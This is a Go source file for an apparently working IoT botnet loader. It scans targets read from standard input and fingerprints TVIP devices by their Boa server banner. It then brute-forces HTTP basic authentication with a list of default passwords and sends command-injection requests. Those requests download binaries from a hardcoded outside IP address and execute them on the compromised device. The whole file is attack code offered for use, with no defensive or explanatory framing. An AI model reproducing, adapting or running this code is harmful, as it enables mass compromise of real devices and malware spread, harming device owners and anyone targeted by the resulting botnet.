/*
Thrown out by bermuda!
*/

package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"math/rand"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

var syncWait sync.WaitGroup
var statusLogins, statusAttempted, statusFound int
var loginsString = []string{"admin:12345", "admin:123456", "admin:admin", "admin:1234", "admin:password"}

func zeroByte(a []byte) {
	for i := range a {
		a[i] = 0
	}
}

func sendExploit(target string, bauth string) int {

	conn, err := net.DialTimeout("tcp", target, 60*time.Second)
	if err != nil {
		return -1
	}

	conn.SetWriteDeadline(time.Now().Add(60 * time.Second))
	conn.Write([]byte("POST /cgi-bin/operator/servetest?cmd=ntp&ServerName=%24%28wget%20http%3A%2F%2F45.153.231.21/bins/%2Farm7%3B%20chmod%20%2Bx%20arm7%3B%20.%2Farm7%20tvip%29&TimeZone=01:00 HTTP/1.1\r\nHost: " + target + "\r\nAuthorization: Basic " + bauth + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 201\r\nOrigin: http://" + target + "\r\nConnection: close\r\nReferer: http://" + target + "/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\ntarget_addr=%3Brm%20-rf%20/var/tmp/wlancont%3Bwget%20http://45.153.231.21/bins/mips%20-O%20->/var/tmp/wlancont%3Bchmod%20777%20/var/tmp/wlancont%3B/var/tmp/wlancont%20fiber.mips&waninf=1_INTERNET_R_VID_\r\n\r\n"))
	conn.SetReadDeadline(time.Now().Add(60 * time.Second))

	bytebuf := make([]byte, 512)
	l, err := conn.Read(bytebuf)
	if err != nil || l <= 0 {
		conn.Close()
		return -1
	}

	fmt.Printf("exploited (%s %s)\r\n", target, bauth)

	return -1
}

func sendLogin(target string) string {

	var isLoggedIn int = 0
	var cntLen int

	var bauth string

	for x := 0; x < len(loginsString); x++ {
		conn, err := net.DialTimeout("tcp", target, 60*time.Second)
		if err != nil {
			return "failed"
		}

		bauth = base64.StdEncoding.EncodeToString([]byte(loginsString[x]))

		conn.SetWriteDeadline(time.Now().Add(60 * time.Second))
		conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nAuthorization: Basic " + bauth + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(cntLen) + "\r\nOrigin: http://" + target + "\r\nConnection: keep-alive\r\nReferer: http://" + target + "/admin/login.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"))
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))

		bytebuf := make([]byte, 512)
		l, err := conn.Read(bytebuf)
		if err != nil || l <= 0 {
			conn.Close()
			return "failed"
		}

		if strings.Contains(string(bytebuf), "200 OK") {
			isLoggedIn = 1
		}

		zeroByte(bytebuf)

		if isLoggedIn == 0 {
			conn.Close()
			continue
		}

		statusLogins++
		conn.Close()
		break
	}

	if isLoggedIn == 1 {
		return bauth
	} else {
		return "failed"
	}
}

func checkDevice(target string, timeout time.Duration) int {

	var isGpon int = 0

	conn, err := net.DialTimeout("tcp", target, timeout*time.Second)
	if err != nil {
		return -1
	}
	conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 29\r\nOrigin: http://" + target + "\r\nConnection: keep-alive\r\nReferer: http://" + target + "/admin/login.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"))
	conn.SetReadDeadline(time.Now().Add(timeout * time.Second))

	bytebuf := make([]byte, 512)
	l, err := conn.Read(bytebuf)
	if err != nil || l <= 0 {
		conn.Close()
		return -1
	}

	if strings.Contains(string(bytebuf), "Server: Boa/0.94.14rc21") && strings.Contains(string(bytebuf), "TVIP") {
		statusFound++
		isGpon = 1
	}
	zeroByte(bytebuf)

	if isGpon == 0 {
		conn.Close()
		return -1
	}

	conn.Close()
	return 1
}

func processTarget(target string, rtarget string) {

	defer syncWait.Done()

	if checkDevice(target, 10) == 1 {
		bauth := sendLogin(target)

		if bauth == "failed" {
			return
		}

		sendExploit(target, bauth)
		return
	} else {
		return
	}
}

func main() {

	rand.Seed(time.Now().UTC().UnixNano())
	var i int = 0
	go func() {
		for {
			fmt.Printf("%d's | Total: %d, Found: %d, Logins: %d\r\n", i, statusAttempted, statusFound, statusLogins)
			time.Sleep(1 * time.Second)
			i++
		}
	}()

	routines, _ := strconv.Atoi(os.Args[2])

	for {
		r := bufio.NewReader(os.Stdin)
		scan := bufio.NewScanner(r)
		for scan.Scan() {
			if runtime.NumGoroutine() > routines {
				time.Sleep(1 * time.Second)
			}
			if os.Args[1] != "manual" {
				go processTarget(scan.Text()+":"+os.Args[1], scan.Text())
			} else {
				go processTarget(scan.Text(), scan.Text())
			}
			statusAttempted++
			syncWait.Add(1)
		}
	}
}
